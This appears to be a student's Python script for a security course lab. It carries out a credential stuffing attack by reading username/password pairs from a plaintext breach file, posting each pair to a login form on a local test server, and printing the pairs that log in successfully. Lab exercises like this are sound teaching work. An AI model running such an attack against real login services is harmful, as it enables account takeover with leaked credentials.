#For this file, the majority of the code that we added can be found in the
#credential_stuffing_attack function (any other additions were just import
#statements or something simple like that).

from csv import reader
from requests import post, codes

LOGIN_URL = "http://localhost:8080/login"

PLAINTEXT_BREACH_PATH = "app/scripts/breaches/plaintext_breach.csv"

def load_breach(fp):
    with open(fp) as f:
        r = reader(f, delimiter=' ')
        header = next(r)
        assert(header[0] == 'username')
        return list(r)

def attempt_login(username, password):
    response = post(LOGIN_URL,
                    data={
                        "username": username,
                        "password": password,
                        "login": "Login",
                    })
    return response.status_code == codes.ok 

#For this function, we read in the usernames and passwords from the plain text
#breach. For each pair, we attempt to log in: if the log in is successful, we
#add the pair to our credential_pairs list, otherwise we continue through the
#loop. At the end, we print and return the list of pairs and print the 3
#successful pairs, as is expected.
def credential_stuffing_attack(creds):
    credential_pairs = list()
    for i in range(len(creds)):
        if attempt_login(creds[i][0], creds[i][1]) == True:
            credential_pairs.append(tuple([creds[i][0], creds[i][1]]))
        else:
            continue
    print(credential_pairs)
    return credential_pairs

def main():
    creds = load_breach(PLAINTEXT_BREACH_PATH)
    credential_stuffing_attack(creds)

if __name__ == "__main__":
    main()
